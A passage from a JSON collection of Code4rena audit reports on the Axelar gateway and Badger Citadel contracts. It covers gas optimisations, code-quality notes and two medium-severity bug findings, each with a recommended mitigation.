lowerBoundOperatorEpoch = epoch > recentEpochs ? epoch - recentEpochs : uint256(0); //@audit gas: should be unchecked due to condition in ternary operation\n```\n\n### Errors\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```solidity\nBurnableMintableCappedERC20.sol:58:        require(!EternalStorage(owner).getBool(KEY_ALL_TOKENS_FROZEN), 'IS_FROZEN');\nBurnableMintableCappedERC20.sol:59:        require(!EternalStorage(owner).getBool(keccak256(abi.encodePacked(PREFIX_TOKEN_FROZEN, symbol))), 'IS_FROZEN');\nDepositHandler.sol:12:        require(_lockedStatus == IS_NOT_LOCKED);\nERC20.sol:164:        require(sender != address(0), 'ZERO_ADDR');\nERC20.sol:165:        require(recipient != address(0), 'ZERO_ADDR');\nERC20.sol:184:        require(account != address(0), 'ZERO_ADDR');\nERC20.sol:205:        require(account != address(0), 'ZERO_ADDR');\nERC20.sol:232:        require(owner != address(0), 'ZERO_ADDR');\nERC20.sol:233:        require(spender != address(0), 'ZERO_ADDR');\nERC20Permit.sol:43:        require(block.timestamp < deadline, 'EXPIRED');\nERC20Permit.sol:44:        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, 'INV_S');\nERC20Permit.sol:45:        require(v == 27 || v == 28, 'INV_V');\nERC20Permit.sol:56:        require(recoveredAddress == issuer, 'INV_SIG');\nMintableCappedERC20.sol:25:        require(capacity == 0 || totalSupply + amount <= capacity, 'CAP_EXCEEDED');\nOwnable.sol:16:        require(owner == msg.sender, 'NOT_OWNER');\nOwnable.sol:21:        require(newOwner != address(0), 'ZERO_ADDR');\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/14"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Functions Visibility Can Be Declared External\n**Context**: [`ERC20.sol#L69-L72`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L69-L72), [`ERC20.sol#L81-L84`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L81-L84), [`ERC20.sol#L99-L107`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L99-L107), [`ERC20.sol#L121-L124`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L121-L124), [`ERC20.sol#L140-L143`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L140-L143), [`MintableCappedERC20.sol#L23-L28`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/MintableCappedERC20.sol#L23-L28), [`Ownable.sol#L20-L25`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/Ownable.sol#L20-L25), [`EternalStorage.sol#L18-L20`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/Ownable.sol#L20-L25), [`EternalStorage.sol#L22-L24`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/EternalStorage.sol#L22-L24), [`EternalStorage.sol#L26-L28`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/EternalStorage.sol#L26-L28), [`EternalStorage.sol#L30-L32`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/EternalStorage.sol#L30-L32), [`EternalStorage.sol#L34-L36`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/EternalStorage.sol#L34-L36), [`EternalStorage.sol#L38-L40`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/EternalStorage.sol#L38-L40)\n\n**Description**:\nSeveral functions across multiple contracts have a public visibility and can be marked with external visibility to save gas. \n\n\n**Recommendation**: \nChange the functions visibility to external to save gas.\n\n\n## Catching The Array Length Prior To Loop\n**Context**: [`AxelarGatewayMultisig.sol#L41-L49`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L41-L49), [`AxelarGatewayMultisig.sol#L114-L123`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L114-L123), [`AxelarGatewayMultisig.sol#L267-L276`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L267-L276)\n\n**Description**:\nOne can save gas by caching the array length (in stack) and using that set variable in the loop. Replace state variable reads and writes within loops with local variable reads and writes. This is done by assigning state variable values to new local variables, reading and/or writing the local variables in a loop, then after the loop assigning any changed local variables to their equivalent state variables.\n\n\n**Recommendation**: \nSimply do something like so before the for loop: ```uint length =  variable.length```. Then add ```length``` in place of ``` variable.length``` in the for loop. \n\n\n## Function Ordering via Method ID\n**Context**: [`All Contracts`](https://github.com/code-423n4/2022-04-axelar)\n\n**Description**:\nContracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.\n\n**Recommendation**: \nFind a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas.\n\n\n## Use ++index instead of index++ to increment a loop counter\n**Context**: [`AxelarGateway.sol#L221-L228`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L221-L228), [`AxelarGatewayMultisig.sol#L136-L143`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L136-L143), [`AxelarGatewayMultisig.sol#L167-L191`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L167-L191), [`AxelarGatewayMultisig.sol#L267-L276`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L267-L276), [`AxelarGatewayMultisig.sol#L289-L296`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L289-L296), [`AxelarGatewayMultisig.sol#L318-L344`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L318-L344), [`AxelarGatewayMultisig.sol#L490-L575 (for both for loops)`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L490-L575), [`AdminMultisigBase.sol#L25-L54`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AdminMultisigBase.sol#L25-L54), [`AdminMultisigBase.sol#L144-L168`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AdminMultisigBase.sol#L144-L168)\n\n**Description**:\nDue to reduced stack operations, using ++index saves 5 gas per iteration.\n\n**Recommendation**: \nUse ++index to increment a loop counter.\n\n\n## State Variable Is Read From More Than Once In A Function\n**Context**: [`AxelarGateway.sol#L558-L560`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L558-L560)\n\n**Description**:\nIf there's a state variable you'll read from more than once in a function, it's best to cast it into memory.\n\n**Recommendation**: \nWhere state varibables are read from more than once in a function, cast it into memory and then use the casted varable.\n\n\n## Setting The Constructor To Payable\n**Context**: [`Ownable.sol#L10-L13`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/Ownable.sol#L10-L13), [`BurnableMintableCappedERC20.sol#L21-L26`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/BurnableMintableCappedERC20.sol#L21-L26), [`MintableCappedERC20.sol#L14-L21`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/MintableCappedERC20.sol#L14-L21), [`ERC20Permit.sol#L22-L32`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20Permit.sol#L22-L32), [`ERC20.sol#L51-L59`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L51-L59), [`AxelarGatewayMultisig.sol#L39`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L39), [`AxelarGateway.sol#L66-L68`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L66-L68), [`AxelarGatewayProxy.sol#L16-L24`](https://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayProxy.sol#L16-L24)\n\n**Description**:\nYou can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.\n\n**Recommendation**: \nSet the constructor to payable.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/13"
    }
  },
  {
    "title": "User's funds can get lost when transferring to other chain",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L384-L389\n\n\n# Vulnerability details\n\n## Impact\nWhen transferring tokens to other chain, the tokens in the source chain are burned - if they are external they will be transferred to the AxelarGateway, otherwise they will be burned. In the target chain the same amount of tokens will be minted for the user - if it is external it will be transferred to him from the AxelarGateway, otherwise it will be minted to him.\nBut there is a problem - if the AxelarGateway doesn't have the needed amount of token for some reason, the `_callERC20Token` with the `transfer` function selector will fail and return false, which will make the `_mintToken` function revert. Because it reverted, the user won't get his funds on the destination chain, although he payed the needed amount in the source chain.\n\n## Tools Used\nVS Code and Remix\n\n## Recommended Mitigation Steps\nInstead of reverting when the transfer is not successful, simply call the `callContractWithToken` with the source chain as the destination chain in order to return the user his funds.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/12"
    }
  },
  {
    "title": "Low level call returns true if the address doesn't exist",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L545-L548\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayProxy.sol#L16-L24\n\n\n# Vulnerability details\n\n## Impact\nAs written in the [solidity documentation](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions), the low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. \n\n## Proof of Concept\nThe low-level functions `call` and `delegatecall` are used in some places in the code and it can be problematic. For example, in the `_callERC20Token` of the `AxelarGateway` contract there is a low level call in order to call the ERC20 functions, but if the given `tokenAddress` doesn't exist `success` will be equal to true and the function will return true and the code execution will be continued like the call was successful. \n```sol\nfunction _callERC20Token(address tokenAddress, bytes memory callData) internal returns (bool) {\n    (bool success, bytes memory returnData) = tokenAddress.call(callData);\n    return success && (returnData.length == uint256(0) || abi.decode(returnData, (bool)));\n}\n```\nAnother place that this can happen is in `AxelarGatewayProxy`'s constructor\n```sol\nconstructor(address gatewayImplementation, bytes memory params) {\n    _setAddress(KEY_IMPLEMENTATION, gatewayImplementation);\n\n   (bool success, ) = gatewayImplementation.delegatecall(\n       abi.encodeWithSelector(IAxelarGateway.setup.selector, params)\n   );\n\n    if (!success) revert SetupFailed();\n}\n```\nIf the `gatewayImplementation` address doesn't exist, the delegate call will return true and the function won't revert.\n\n## Tools Used\nRemix, VS Code\n\n## Recommended Mitigation Steps\nCheck before any low-level call that the address actually exists, for example before the low level call in the callERC20 function you can check that the address is a contract by checking its code size.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/11"
    }
  },
  {
    "title": "QA Report",
    "body": "# Low and Non-critical Bugs\n* Force receiving ether in the `AxelarGatewayProxy` might be unwanted\n    The receive function of the `` contract is implemented so ETH can't be transferred to the contract.\n    ```sol\n    receive() external payable {\n        revert('NO_ETHER');\n    }\n    ```\n    However, ETH can still be transferred to the contract by using `selfdestruct`. `selfdestruct` sends all remaining Ether stored in the contract to a designated address. So ETH can still be transferred to the contract.\n\n* Forgot a TODO comment in the `burnFrom` function of the `MintableCappedERC20` contract\n* Anyone can destroy the `DepositHandler` contract and receive its balance\n    It could be better to use access controls in order to prevent malicious function calls (in the current implementation there's no problem because the contract is destructed in the same transaction it is created, but it is a problematic and dangerous implementation).\n* Use accept ownership to avoid transferring ownership to a non-existing address\n    In the current implementation, if the transferOwnership function is called with an invalid address, the ownership will be transferred to this address and it can DoS the system. It will be better to make the new owner call a function before actually transferring the ownership, in order to validate that the new owner's address is valid and reachable.\n    ```sol\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), 'ZERO_ADDR');\n\n        emit OwnershipTransferred(owner, newOwner);\n        owner = newOwner;\n    }\n    ```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/10"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations\n* For loop in `AdminMultisigBase`, `AxelarGatewayMultisig`\n* Loop optimizations\n    Loops can be optimized in several ways. Let's take for example the loop in the `_areValidOwnersInEpoch` function in `AxelarGatewayMultisig`.\n    ```sol\n    for (uint256 i; i < accounts.length; i++) {\n        if (_isOwner(epoch, accounts[i]) && ++validSignerCount >= threshold) return true;\n    }\n    ```\n    We can do multiple things here:\n    1. Use ++i instead of i++ to save some gas spent in every iteration.\n    2. Save the array length in a local variable before the loop instead of accessing it in every iteration.\n\n    There are more loops in the code that can be optimized the same way, most of them in the `AxelarGatewayMultisig` and some more in the `AdminMultisigBase` and `AxelarGateway` contracts.\n\n* Use unchecked in the `ERC20` contract\n    In several functions in the `ERC20` contract unchecked can be used. For example, in the `_mint` function unchecked can be used on the addition to the balance of the user, because if it will overflow, the totalSupply will overflow too.\n    new code:\n    ```sol\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), 'ZERO_ADDR');\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        totalSupply += amount;\n        unchecked {\n            balanceOf[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n    }\n    ```\n    In the `_burn` function, unchecked can be used when subtracting from the totalSupply, because if it will underflow the balance of the user will underflow too. \n    new code:\n    ```sol\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), 'ZERO_ADDR');\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        balanceOf[account] -= amount;\n        unchecked {\n            totalSupply -= amount;\n        }\n        emit Transfer(account, address(0), amount);\n    }\n    ```\n    In the `_transfer` function we can use unchecked when adding to the recipient balance, because the totalSupply doesn't change and it promises us that the balance of the user will be less than or equal to the totalSupply, so it won't overflow.\n    new code:\n    ```sol\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), 'ZERO_ADDR');\n        require(recipient != address(0), 'ZERO_ADDR');\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        balanceOf[sender] -= amount;\n        unchecked {\n            balanceOf[recipient] += amount;\n        }\n        emit Transfer(sender, recipient, amount);\n    }\n    ```\n* Don't cast numbers to uint256, it does that automatically and costs more gas if you do (for example in the `AxelarGateway` contract you are using `uint256(0)` instead of simply `0`, which costs more gas).\n* Use 1 and 2 as the mutex values in `DepositHandler` to save gas. Changing a value of a uint variable from non-zero value to a non-zero value costs less gas than changing it from zero to a non-zero value or from a non-zero value ot zero.\n* Calculate hash values pre-deployment to save gas on the constructor. For example in `AdminMultisigBase` there are multiple hashes that can be calculated pre-deployment instead of being calculated when deploying and waste gas\n    ```sol\n    bytes32 internal constant KEY_OWNER_EPOCH = keccak256('owner-epoch');\n\n    bytes32 internal constant PREFIX_OWNER = keccak256('owner');\n    bytes32 internal constant PREFIX_OWNER_COUNT = keccak256('owner-count');\n    bytes32 internal constant PREFIX_OWNER_THRESHOLD = keccak256('owner-threshold');\n    bytes32 internal constant PREFIX_IS_OWNER = keccak256('is-owner');\n\n    bytes32 internal constant KEY_OPERATOR_EPOCH = keccak256('operator-epoch');\n\n    bytes32 internal constant PREFIX_OPERATOR = keccak256('operator');\n    bytes32 internal constant PREFIX_OPERATOR_COUNT = keccak256('operator-count');\n    bytes32 internal constant PREFIX_OPERATOR_THRESHOLD = keccak256('operator-threshold');\n    bytes32 internal constant PREFIX_IS_OPERATOR = keccak256('is-operator');\n    ```\n* Use `deleteBool` instead of `_setVoteCount(adminEpoch, topic, uint256(0));` in `AdminMultisigBase` to get gas refunds for deleting a storage value\n* Use one require instead of two in `_transfer`\n    ```sol\n    require(sender != address(0) && recipient != address(0), 'ZERO_ADDR');\n    ```\n    this can be done also in the `_approve` function in `ERC20` and `_beforeTokenTransfer` function in `BurnableMintableCappedERC20`\n* Save return value of `_msgSender()` in `decreaseAllowance`, `increaseAllowance`, `transferFrom` instead of calling it multiple times (or simply use msg.sender to avoid a function call)",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/9"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Table of Contents\n\n- [Check zero denominator](#check-zero-denominator)\n- [nonReentrant modifier unused](#nonreentrant-modifier-unused)\n- [Unbounded for loop](#unbounded-for-loop)\n- [Typos](#typos)\n- [Comment Missing function parameter](#comment-missing-function-parameter)\n- [Function missing comments](#function-missing-comments)\n- [Related data should be grouped in struct](#related-data-should-be-grouped-in-struct)\n- [Events emitted early](#event-emitted-early)\n- [Unused storage variable](#unused-storage-variable)\n- [Redundant variable declaration](#redundant-variable-declaration)\n- [Incorrect variable type](#incorrect-variable-type)\n- [Uint256 alias](#uint256-alias)\n\n# Check zero denominator \n\n## PROBLEM\n\nWhen a division is computed, it must be ensured that the denominator is non-zero to prevent failure of the function call.\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Funding.sol\n\n```\nFunding.sol:225: \txCitadel.getPricePerFullShare()\n```\n\n\n\n### StakeCitadel.sol\n\n```\nStakeCitadel.sol:808: \ttotalSupply()\nStakeCitadel.sol:890: \t_pool\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nBefore doing these computations, add a non-zero check to the variables aforementioned.\n\n\n\n\n# nonReentrant modifier unused \n\n## PROBLEM\n\nSome external functions calling the ERC20 methods `safeTransfer` or `safeTransferFrom` do not have the nonReentrant modifier and are hence unprotected to reentrancy (besides the gas limit on the methods)\n\n\n\n## SEVERITY\n\nLow\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### CitadelToken.sol\n\n```\nFunding.sol: 334 claimAssetToTreasury()\n```\n\n\n\n### KnightingRound.sol\n\n```\nKnightingRound.sol: 209 claim()\n```\n\n\n\n### StakedCitadel.sol\n\n```\nStakedCitadel.sol: 698 sweepExtraToken(address _token)\nStakedCitadel.sol: 717 earn()\n```\n\n\n\n### StakedCitadelVester.sol\n\n```\nStakedCitadelVester.sol: 85 claim(address recipient, uint256 amount)\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nUse the nonReentrant modifier on these functions.\n\n\n\n\n# Unbounded for loop \n\n## PROBLEM\n\nThere is no restriction on the numbers of pool added, either in `_addFundingPool()` or `setFundingPoolWeight()`. Hence, the for loop in `CitadelMinter.sol` is unbounded, which could result in the gas required to perform the function call exceeding the gas limit if the number of pools is too high, preventing the distribution of citadel tokens to the funding pools.\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### CitadelMinter.sol\n\n```\nCitadelMinter.sol:344:\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd an upper limit to the total amount of funding pools, and add a check before adding a pool in `setFundingPoolWeight(): 274`\n\n\n\n\n# Typos\n\n## PROBLEM\n\nThere are a few typos in some comments\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### CitadelMinter.sol\n\n```\nCitadelMinter.sol: 101 expection\n```\n\n\n\n### Funding.sol\n\n```\nFunding.sol: 289 cumulatiive\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nCorrect the typos.\n\n\n\n\n# Comment Missing function parameter\n\n## PROBLEM\n\nSome of the function comments are missing function parameters or returns\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Funding.sol\n\n```\nFunding.sol:110 address _citadelPriceInAssetOracle\n```\n\n\n\n### GlobalAccessControl.sol\n\n```\nGlobalAccessControl.sol: 107 bytes32 role, string memory roleString,bytes32 adminRole\n```\n\n\n\n### KnightingRound.sol\n\n```\nKnightingRound.sol: 109 address _globalAccessControl\nKnightingRound.sol: 209 uint256 tokenOutAmount_\n```\n\n\n\n### StakedCitadel.sol\n\n```\nStakedCitadel.sol: 175 address _vesting\nStakedCitadel.sol: 363 bytes32[] memory proof\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a comment for these parameters\n\n\n\n\n# Function missing comments\n\n## PROBLEM\n\nSome functions are missing comments.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### CitadelMinter.sol\n\n```\nCitadelMinter.sol: 143 getFundingPoolWeights()\nCitadelMinter.sol: 314 initializeLastMintTimestamp()\nCitadelMinter.sol: 338 _transferToFundingPools(uint256 _citadelAmount)\nCitadelMinter.sol: 362 _removeFundingPool(address _pool)\nCitadelMinter.sol: 374 _addFundingPool(address _pool)\n```\n\n\n\n### Funding.sol\n\n```\nFunding.sol: 278 clearCitadelPriceFlag()\nFunding.sol: 383 setSaleRecipient(address _saleRecipient)\nFunding.sol: 397 setCitadelAssetPriceBounds(uint256 _minPrice, uint256 _maxPrice)\n```\n\n\n\n### GlobalAccessControl.sol\n\n```\nGlobalAccessControl.sol: 94 pause()\nGlobalAccessControl.sol: 99 unpause()\n```\n\n\n\n### KnightingRound.sol\n\n```\nKnightingRound.sol: 109 address _globalAccessControl\nKnightingRound.sol: 209 uint256 tokenOutAmount_\n```\n\n\n\n### StakedCitadelVester.sol\n\n```\nStakedCitadelVester.sol: 59 initialize(address _gac, address _vestingToken, address _vault)\n```\n\n\n\n### SupplySchedule.sol\n\n```\nSupplySchedule.sol: 43 initialize(address _gac)\nSupplySchedule.sol: 67 getCurrentEpoch()\nSupplySchedule.sol: 71 getEmissionsForEpoch(uint256 _epoch)\nSupplySchedule.sol: 79 getEmissionsForCurrentEpoch()\nSupplySchedule.sol: 84 getMintable(uint256 lastMintTimestamp)\nSupplySchedule.sol: 132 setMintingStart(uint256 _globalStartTimestamp)\nSupplySchedule.sol: 150 setEpochRate(uint256 _epoch, uint256 _rate)\n\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd comments to these functions\n\n\n\n\n# Related data should be grouped in struct\n\n## PROBLEM\n\nWhen there are mappings that use the same key value, having separate fields is error prone, for instance in case of deletion or with future new fields.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### KnightingRound.sol\n\n```\nKnightingRound.sol: 47 mapping(address => uint256) public boughtAmounts;\nKnightingRound.sol: 51 mapping(address => bool) public hasClaimed;\n```\n\n\n\n### StakedCitadel.sol\n\n```\nStakedCitadel.sol: 94:     mapping(address => uint256) public additionalTokensEarned;\nStakedCitadel.sol: 95:     mapping(address => uint256) public lastAdditionalTokenAmount;\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nGroup the related data in a struct and use one mapping. For instance, for the `StakedCitadel.sol` mappings, the mitigation could be:\n\n```\nstruct AdditionalTokens {\n  uint256 tokensEarned;\n  uint256 lastAmount;\n}\n```\n\nAnd it would be used as a state variable:\n\n```\nmapping(address =>  AdditionalTokens) additionalTokens;\n```\n\n\n\n\n\n# Events emitted early\n\n## PROBLEM\n\nIt is not recommended to emit events before the end of the computations, as the function might revert based on conditions ahead of the event emission\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Funding.sol\n\n```\nFunding.sol: 328 Sweep(_token, amount) //emitted before amount transferred to saleRecipient\n```\n\n\n\n### KnightingRound.sol\n\n```\nKnightingRound.sol: 413 Sweep(_token, amount) //emitted before amount transferred to saleRecipient\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nPlace the event emission in the last position in the function.\n\n\n\n\n# Unused storage variable\n\n## PROBLEM\n\nThough they are allowed in Solidity and do not pose a direct security issue, it is best practice to avoid declaring storage variables that are not used.\n\n\nThey cause an increase in computations (and unnecessary gas consumption) and can decrease readability of the code\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### GlobalAccessControl.sol\n\n```\nGlobalAccessControl.sol:51:\n\t//storage variable transferFromDisabled never initialized or read.\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nRemove this storage variable\n\n\n\n\n# Redundant variable declaration\n\n## PROBLEM\n\nIt is best to use as few local variables as possible to avoid unnecessary computations.\n\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### StakedCitadel.sol\n\n```\nStakedCitadel.sol: 773\n\nuint256 _before = token.balanceOf(address(this));\n\n//_pool is already initialized with token.balanceOf(address(this));\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nremove the declaration of `_before` line 773, and replace `_before` line 776 with `_pool`\n\n\nFor clarity, you can rename `_before` and `_after` as `_poolBefore` and `_poolAfter`\n\n\n\n\n# Incorrect variable type\n## PROBLEM\n\n`cachedXCitadel` is an instance of `IVault`, not an address. Even if the code compiles and works, the syntax in the `deposit()` call is misleading.\n\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### CitadelMinter.sol\n\n```\nCitadelMinter.sol: 195\n\nIVault(cachedXCitadel).deposit(lockingAmount);\n//cachedXCitadel is not an address\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nreplace `IVault(cachedXCitadel)` with\n`cachedXCitadel`\n\n\n\n\n# Uint256 alias\n\n## PROBLEM\n\n`uint` is an alias for `uint256`.\n\nIt is better to use uint256: it brings readability and consistency in the code, and it future proofs it in case of any changes to the alias of uint\n\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### Funding.sol\n\n```\nFunding.sol: 224\nuint citadelAmount = getAmountOut(_assetAmountIn);\n\nFunding.sol: 419\nuint _citadelPriceInAsset;\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nreplace `uint` with\n`uint256`\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-04-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/223"
    }
  },
  {
    "title": "QA Report",
    "body": "Declare modifiers together\n\n### Handle\n\ntchkvsky\n\n### Scope\n\n`Funding.sol`\n\n`GlobalAccessControlManaged.sol`\n\n### Vulnerability details\n\n[`onlyCitadelPriceInAssetOracle()`](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/Funding.sol#L79-L85) modifier in `Funding.sol` should be declared after the events.\n\nAlso, the [modifiers](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/lib/GlobalAccessControlManaged.sol#L35-L74) declared in `GlobalAccessControlManaged.sol` should be placed before any function declaration, specifically, `__GlobalAccessControlManaged_init()`. This will aid contract readability.\n\n### Tools Used\n\nManual review\n\n### Recommendation\n\nDeclare modifiers together. Group events together. Follow the recommended contract layout. Inside each contract, library or interface, use the following order:\n\n1. Type declarations\n  \n2. State variables\n  \n3. Events\n  \n4. Modifiers\n  \n5. Functions\n  \n\nUseful link:\n\n[Order Of Layout | Style Guide ！ Solidity 0.8.14 documentation](https://docs.soliditylang.org/en/latest/style-guide.html#order-of-layout)\n\n---\n\nMissing or incomplete natspec comments\n\n### Scope\n\n`CitadelMinter.sol`\n\n`Funding.sol`\n\n`GlobalAccessControl.sol`\n\n`KnigthingRound.sol`\n\n`StakedCitadel.sol`\n\n`StakedCitadelVester.sol`\n\n`SupplySchedule.sol`\n\n### 